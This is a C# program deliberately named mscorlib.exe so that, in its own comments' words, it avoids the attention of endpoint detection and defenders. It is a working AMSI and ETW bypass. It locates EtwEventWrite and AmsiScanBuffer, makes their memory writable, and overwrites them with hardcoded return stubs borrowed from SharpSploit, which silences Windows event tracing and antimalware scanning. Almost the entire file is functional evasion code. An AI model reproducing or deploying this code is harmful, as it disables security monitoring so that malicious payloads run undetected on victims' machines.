using System;
using System.Runtime.InteropServices;   // For code marshalling between Managed Code (C#) and Unmanaged Code (WinAPI, C++)

// We are naming this exe file as mscorlib.exe because
// mscorlib is the assembly that contains the core implementation of the .NET framework.
// A legitimate mscorlib always get loaded into all C# binaries by default and we just want to use this name in order
// to bypass attention of End-point detection system or defenders.
namespace mscorlib
{
    class Program
    {
        // see: https://www.pinvoke.net/default.aspx/kernel32.GetProcAddress
        // WinAPI function: To get address of the Protection function EtwEventWrite and AmsiScanBuffer.
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        // see: https://www.pinvoke.net/default.aspx/kernel32.LoadLibrary
        // WinAPI function: To find address of the Protection function EtwEventWrite and AmsiScanBuffer, we 1st need to find out
        //                  address of the responsible DLL, ntdll.dll and amsi.dll respectively.
        [DllImport("kernel32")]
	    static extern IntPtr LoadLibrary(string name);

        // see: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
        // WinAPI function: In order to overwrite the behaviour of the security function, we 1st need to change the memory protection
        //                  mode of these functions, EtwEventWrite and AmsiScanBuffer.
        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        //Checking Whether Victim machine is 64bit or not depending on that, size of Intptr is made.
        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;    // 8byte
            }
        }

        static byte[] MagicByte(string function)
        {
            // For holding bytes (magic) which can patch ETWEventWrite.
            byte[] patch;

            // This portion is taken from https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Evasion/ETW.cs
            // also from: https://blog.xpnsec.com/hiding-your-dotnet-etw/
            if (function.ToLower() == "etwbypass")
            {
                if (Is64Bit)
                {
                    patch = new byte[2];
                    patch[0] = 0xc3;
                    patch[1] = 0x00;
                }
                else
                {
                    patch = new byte[3];
                    patch[0] = 0xc2;
                    patch[1] = 0x14;
                    patch[2] = 0x00;
                }
                return patch;
            }
            else if (function.ToLower() == "amsibypass")
            {
                // This portion is taken from https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Evasion/Amsi.cs
                if (Is64Bit)
                {
                    patch = new byte[6];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC3;
                }
                else
                {
                    patch = new byte[8];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC2;
                    patch[6] = 0x18;
                    patch[7] = 0x00;

                }
                return patch;
            }
            else throw new ArgumentException("[-] Function is not supported!");
        }

        static void EtwBypass()
        {
            string traceloc = "ntdll.dll";
            string magicFunction = "EtwEventWrite";

            // Storing ntdll.dll memory address location
            IntPtr ntdllAddr = LoadLibrary(traceloc);

            // Storing EtwEventWrite function address location
            IntPtr traceAddr = GetProcAddress(ntdllAddr, magicFunction);

            // Calling MagicByte to return bytes to patch EtwEventWrite
            byte[] magicbyte = MagicByte("EtwBypass");

            // see: https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants#constants
            VirtualProtect(traceAddr, (UIntPtr)magicbyte.Length, 0x40, out uint oldProtect);

            // see for whole Marshal.copy docs:
            // https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-5.0

            /*
            Copy(float[] source, int startIndex, IntPtr destination, int length)

            see: https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-5.0#System_Runtime_InteropServices_Marshal_Copy_System_Single___System_Int32_System_IntPtr_System_Int32_
            */
            Marshal.Copy(magicbyte, 0, traceAddr, magicbyte.Length);

            // Restoring function back to its original memory protection again
            VirtualProtect(traceAddr, (UIntPtr)magicbyte.Length, oldProtect, out uint newOldProtect);
	    Console.WriteLine("[+] EtwEventWrite function has been patched!");
        }
        static void AmsiBypass()
        {
            string avloc = "amsi.dll";
            string magicFunction = "AmsiScanBuffer";

            // Storing amsi.dll memory address location
            IntPtr avAddr = LoadLibrary(avloc);

            // Storing AmsiScanBuffer function address location
            IntPtr traceAddr = GetProcAddress(avAddr, magicFunction);

            // Calling MagicByte to return bytes to patch AmsiScanBuffer
            byte[] magicbyte = MagicByte("AmsiBypass");


            VirtualProtect(traceAddr, (UIntPtr)magicbyte.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicbyte, 0, traceAddr, magicbyte.Length);

            VirtualProtect(traceAddr, (UIntPtr)magicbyte.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("[+] AmsiScanBuffer function has been patched!\n");
        }
        static void Main(string[] args)
        {
            EtwBypass();
            //Console.ReadKey();
            AmsiBypass();
            //Console.ReadKey();
        }
    }
}

